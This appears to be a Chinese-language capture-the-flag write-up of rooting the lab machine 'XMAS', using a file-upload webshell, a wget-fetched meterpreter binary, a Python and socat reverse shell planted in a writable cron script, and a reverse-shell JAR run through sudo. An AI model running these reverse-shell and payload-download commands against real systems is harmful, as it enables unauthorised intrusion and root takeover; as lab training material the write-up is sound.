---
title: XMAS
tags:
  - sec
date: 2024-02-14T17:08:44
lastmod: 2025-09-29T20:51:34
toc: "true"
---
## 靶机, 启动
```bash
192.168.10.16
```
## 端口扫描

![HMM_XMAS_image_1](https://img.l1uyun.one/HMM_XMAS_image_1.png)


![HMM_XMAS_image_2](https://img.l1uyun.one/HMM_XMAS_image_2.png)

## web 服务
目录扫描

![HMM_XMAS_image_3](https://img.l1uyun.one/HMM_XMAS_image_3.png)

在主页的下面发现了一个上传点, 直接上传反弹 shell

![HMM_XMAS_image_4](https://img.l1uyun.one/HMM_XMAS_image_4.png)

使用 nc 失败, 换成了 webshell

![HMM_XMAS_image_5](https://img.l1uyun.one/HMM_XMAS_image_5.png)


![HMM_XMAS_image_6](https://img.l1uyun.one/HMM_XMAS_image_6.png)
然后还是用了 meterpreter

```bash
wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell.elf
```
## www-data ,进一步收集信息

/home/alabaster/nice_list. txt

![HMM_XMAS_image_7](https://img.l1uyun.one/HMM_XMAS_image_7.png)

这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的

![HMM_XMAS_image_8](https://img.l1uyun.one/HMM_XMAS_image_8.png)


```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.11",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > nice_or_naughty.py


echo 'import subprocess; subprocess.call(["/tmp/newshell.elf"])' > nice_or_naughty.py
```

又是这样子不稳定的 shell

![HMM_XMAS_image_9](https://img.l1uyun.one/HMM_XMAS_image_9.png)

上传一个 socat 二进制文件上去算了

```bash
echo 'import subprocess; subprocess.call(["/tmp/socat", "TCP:192.168.10.11:4445", "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"])' > nice_or_naughty.py
```
还是不行

![HMM_XMAS_image_10](https://img.l1uyun.one/HMM_XMAS_image_10.png)
## User-alabaster
巨魔大佬 nb

又学到一个工具 pwncat
![HMM_XMAS_image_11](https://img.l1uyun.one/HMM_XMAS_image_11.png)

## 提权_sudo 执行 jar
![HMM_XMAS_image_12](https://img.l1uyun.one/HMM_XMAS_image_12.png)

利用 sudo 涉及的文件可写, 用 gpt 生成了个 java 的反弹 shell

```bash
## 编译成java字节码
javac ReverseShell.java


## JAR文件需要一个清单文件（Manifest），这个文件指定了JAR的主类（包含main方法的类）。主类是当JAR文件被执行时首先加载的类。
echo 'Main-Class: ReverseShell' > Manifest.txt


## 使用jar命令和上面创建的清单文件将编译后的.class文件打包成一个JAR文件。命令格式如下：
jar cfm ReverseShell.jar Manifest.txt ReverseShell.class
```

![HMM_XMAS_image_13](https://img.l1uyun.one/HMM_XMAS_image_13.png)

```bash
cd /tmp 
wget http://192.168.10.11:8000/ReverseShell.jar
cp ReverseShell.jar /home/alabaster/PublishList/PublishList.jar
sudo -u root /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
```

![HMM_XMAS_image_14](https://img.l1uyun.one/HMM_XMAS_image_14.png)

![HMM_XMAS_image_15](https://img.l1uyun.one/HMM_XMAS_image_15.png)